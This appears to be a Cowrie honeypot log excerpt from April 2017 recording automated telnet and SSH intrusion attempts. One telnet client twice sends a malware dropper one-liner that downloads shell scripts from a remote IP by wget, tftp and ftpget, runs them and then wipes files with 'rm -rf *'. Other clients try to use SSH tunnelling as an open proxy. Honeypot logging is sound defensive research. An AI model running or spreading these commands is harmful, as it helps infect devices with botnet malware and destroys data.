+2017-04-30T01:34:52+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48985,5.9.43.239] remote eof
+2017-04-30T01:34:52+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48985,5.9.43.239] remote close
+2017-04-30T01:34:52+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T01:34:52+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T01:34:52+0000 [HoneyPotSSHTransport,48985,5.9.43.239] avatar user logging out
+2017-04-30T01:34:52+0000 [HoneyPotSSHTransport,48985,5.9.43.239] connection lost
+2017-04-30T01:34:52+0000 [HoneyPotSSHTransport,48985,5.9.43.239] Connection lost after 10 seconds
+2017-04-30T01:34:53+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T01:34:53+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T01:34:53+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T01:34:53+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T01:34:53+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T01:34:53+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T01:34:53+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T01:34:53+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T01:34:53+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:54+0000 [SSHChannel None (26) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48849,91.195.103.195] remote eof
+2017-04-30T01:34:54+0000 [SSHChannel None (26) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48849,91.195.103.195] remote close
+2017-04-30T01:34:54+0000 [SSHChannel None (26) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48849,91.195.103.195] sending close 26
+2017-04-30T01:34:56+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] got channel 'direct-tcpip' request
+2017-04-30T01:34:56+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp connection request to 91.121.57.68:80 from localhost:5556
+2017-04-30T01:34:56+0000 [SSHChannel None (71) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp forward to 91.121.57.68:80 with data 'GET /proxy.php HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nConnection: Close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nReferer: RefererString\r\nCookie: param1=CookieString\r\nAccept-Encoding: gzip\r\nHost: chek.zennolab.com\r\n\r\n'
+2017-04-30T01:34:56+0000 [SSHChannel None (71) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] failed to connect: Connection refused
+2017-04-30T01:34:56+0000 [SSHChannel None (71) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] sending close 71
+2017-04-30T01:34:57+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] got channel 'direct-tcpip' request
+2017-04-30T01:34:57+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] direct-tcp connection request to 104.81.104.99:443 from localhost:5556
+2017-04-30T01:34:57+0000 [SSHChannel None (116) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] direct-tcp forward to 104.81.104.99:443 with data "\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80\xfdBN-u\x0e\x15\xbe\xce\x98s \xda\x98E*\xe6\xdc\xcd\x1e'6\xfc\xf9\x1ct\x99\xd4\xf7z\x8fw"
+2017-04-30T01:34:57+0000 [SSHChannel None (116) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] failed to connect: Connection refused
+2017-04-30T01:34:57+0000 [SSHChannel None (116) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] sending close 116
+2017-04-30T01:35:00+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T01:35:00+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T01:35:00+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T01:35:00+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T01:35:00+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T01:35:01+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T01:35:01+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T01:35:01+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T01:35:01+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T01:35:01+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T01:35:01+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
